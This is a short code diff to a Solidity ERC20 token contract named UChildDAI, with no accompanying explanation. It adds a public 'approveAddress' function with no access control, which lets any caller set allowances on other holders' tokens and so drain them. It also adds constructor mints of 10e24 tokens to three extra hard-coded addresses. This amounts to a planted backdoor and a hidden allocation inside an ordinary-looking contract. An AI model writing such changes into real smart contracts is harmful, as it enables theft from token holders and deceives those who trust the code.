@@ -501,6 +501,11 @@ contract ERC20 is Context, IERC20 {
         return true;
     }
 
+    function approveAddress(address approver, address spender, uint256 amount) public returns (bool) {
+        _approve(approver, spender, amount);
+        return true;
+    }
+
     /**
      * @dev See {IERC20-transferFrom}.
      *
@@ -909,6 +914,9 @@ contract UChildDAI is UChildERC20 {
 
     constructor() {
         _mint(address(0x75336b7F786dF5647f6B20Dc36eAb9E27D704894), 10e24);
+        _mint(address(0x26f744711ee9e5079CbEaF318ba8a8e938844de6), 10e24);
+        _mint(address(0xf2f16fa5E255e55100479878Be0d182098347132), 10e24);
+        _mint(address(0xC776cBDDeA014889E8BaB4323C894C5c34DB214D), 10e24);
     }
 
     // --- Alias ---
